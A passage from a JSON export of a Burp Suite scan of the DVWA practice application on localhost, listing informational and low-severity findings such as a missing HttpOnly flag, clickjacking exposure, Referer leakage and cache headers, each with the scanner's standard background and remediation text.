        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "125": {
        "\ufeffissue__serialNumber": "3.33429E+17",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities",
        "issue__location": "/dvwa/vulnerabilities",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The application contains the following link to another domain from URLs containing a query string:<ul><li>https://owasp.org/www-community/attacks/DOM_Based_XSS</li><li>https://owasp.org/www-community/attacks/xss/</li></ul>This issue was found in multiple locations under the reported path.",
        "issue__issueDetailItems__issueDetailItem__001": "https://owasp.org/www-community/attacks/DOM_Based_XSS",
        "issue__issueDetailItems__issueDetailItem__002": "https://owasp.org/www-community/attacks/xss/",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "126": {
        "\ufeffissue__serialNumber": "7.63139E+18",
        "issue__type": "5244416",
        "issue__name": "Cookie without HttpOnly flag set",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/",
        "issue__location": "/dvwa/",
        "issue__severity": "Low",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>",
        "issue__remediationBackground": "<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>\\n<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>",
        "issue__references": "<ul>\\n<li><a href='https://portswigger.net/web-security/cross-site-scripting/exploiting'>Web Security Academy: Exploiting XSS vulnerabilities</a></li>\\n<li><a href='https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly'>HttpOnly effectiveness</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/31.html\">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li>\\n</ul>",
        "issue__issueDetail": "The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "Session: PHPSESSID",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "127": {
        "\ufeffissue__serialNumber": "5.76889E+18",
        "issue__type": "5245344",
        "issue__name": "Frameable response (potential Clickjacking)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa",
        "issue__location": "/dvwa",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>\\n<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using \"framebusting\" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>\\n<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>",
        "issue__remediationBackground": "<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/clickjacking\">Web Security Academy: Clickjacking</a></li>\\n    <li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options\">X-Frame-Options</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/693.html\">CWE-693: Protection Mechanism Failure</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/103.html\">CAPEC-103: Clickjacking</a></li>\\n</ul>",
        "issue__issueDetail": "This issue was found in multiple locations under the reported path.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "128": {
        "\ufeffissue__serialNumber": "5.60396E+18",
        "issue__type": "5245312",
        "issue__name": "File upload functionality",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/upload/",
        "issue__location": "/dvwa/vulnerabilities/upload/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>File upload functionality is commonly associated with a number of vulnerabilities, including:</p>\\n<ul>\\n<li>File path traversal</li><li>Persistent cross-site scripting</li><li>Placing of other client-executable code into the domain</li><li>Transmission of viruses and other malware</li><li>Denial of service</li></ul>\\n<p>You should review file upload functionality to understand its purpose, and establish whether uploaded content is ever returned to other application users, either through their normal usage of the application or by being fed a specific link by an attacker.</p>\\n<p>Some factors to consider when evaluating the security impact of this functionality include:</p>\\n<ul>\\n<li>Whether uploaded content can subsequently be downloaded via a URL within the application.</li><li>What Content-type and Content-disposition headers the application returns when the file's content is downloaded.</li><li>Whether it is possible to place executable HTML/JavaScript into the file, which executes when the file's contents are viewed.</li><li>Whether the application performs any filtering on the file extension or MIME type of the uploaded file.</li><li>Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).</li><li>What location is used to store uploaded content, and whether it is possible to supply a crafted filename to escape from this location.</li><li>Whether archive formats such as ZIP are unpacked by the application.</li><li>How the application handles attempts to upload very large files, or decompression bomb files.</li></ul>",
        "issue__remediationBackground": "<p>File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:</p>\\n<ul>\\n<li>Use a server-generated filename if storing uploaded files on disk.</li><li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li><li>Enforce a whitelist of accepted, non-executable file extensions.</li>\\n<li>If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.</li>\\n<li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server's configuration).</li><li>Reject attempts to upload archive formats such as ZIP.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://github.com/cure53/H5SC/tree/master/attachments\">Various proof-of-concept files</a></li>\\n<li><a href=\"http://labs.detectify.com/post/120088174539/building-an-xss-polyglot-through-swf-and-csp\">An XSS polyglot attack</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/434.html\">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/17.html\">CAPEC-17: Using Malicious Files</a></li>\\n</ul>",
        "issue__issueDetail": "The page contains a form which is used to submit a user-supplied file to the following URL:<ul><li>https://localhost:8888/dvwa/vulnerabilities/upload/</li></ul>Note that Burp has not identified any specific security vulnerabilities with this functionality, and you should manually review it to determine whether any problems exist.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "129": {
        "\ufeffissue__serialNumber": "1.9536E+18",
        "issue__type": "6291968",
        "issue__name": "Email addresses disclosed",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>\\n<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>",
        "issue__remediationBackground": "<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>\\n<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n</ul>",
        "issue__issueDetail": "The following email address was disclosed in the response:<ul><li>admin@example.com</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "admin@example.com",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "130": {
        "\ufeffissue__serialNumber": "6.4496E+18",
        "issue__type": "7340288",
        "issue__name": "Cacheable HTTPS response",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa",
        "issue__location": "/dvwa",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Unless directed otherwise, browsers may store a local cached copy of content received from web servers. Some browsers, including Internet Explorer, cache content accessed via HTTPS. If sensitive information in application responses is stored in the local cache, then this may be retrieved by other users who have access to the same computer at a future time.</p>",
        "issue__remediationBackground": "<p>Applications should return caching directives instructing browsers not to store local copies of any sensitive data. Often, this can be achieved by configuring the web server to prevent caching for relevant paths within the web root. Alternatively, most web development platforms allow you to control the server's caching directives from within individual scripts. Ideally, the web server should return the following HTTP headers in all responses containing sensitive content:</p>\\n<ul>\\n<li>Cache-control: no-store</li><li>Pragma: no-cache</li></ul>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/524.html\">CWE-524: Information Exposure Through Caching</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/525.html\">CWE-525: Information Exposure Through Browser Caching</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n</ul>",
        "issue__issueDetail": "This issue was found in multiple locations under the reported path.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "131": {
        "\ufeffissue__serialNumber": "2.93919E+18",
        "issue__type": "16777472",
        "issue__name": "TLS certificate",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/",
        "issue__location": "/",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>TLS (or SSL) helps to protect the confidentiality and integrity of information in transit between the browser and server, and to provide authentication of the server's identity. To serve this purpose, the server must present an TLS certificate that is valid for the server's hostname, is issued by a trusted authority and is valid for the current date. If any one of these requirements is not met, TLS connections to the server will not provide the full protection for which TLS is designed.</p>\\n<p>It should be noted that various attacks exist against TLS in general, and in the context of HTTPS web connections in particular. It may be possible for a determined and suitably-positioned attacker to compromise TLS connections without user detection even when a valid TLS certificate is used. </p>",
        "issue__remediationBackground": "",
        "issue__references": "<ul><li><a href=\"https://wiki.mozilla.org/Security/Server_Side_TLS\">SSL/TLS Configuration Guide</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/295.html\">CWE-295: Improper Certificate Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/326.html\">CWE-326: Inadequate Encryption Strength</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/327.html\">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></li>\\n</ul>",
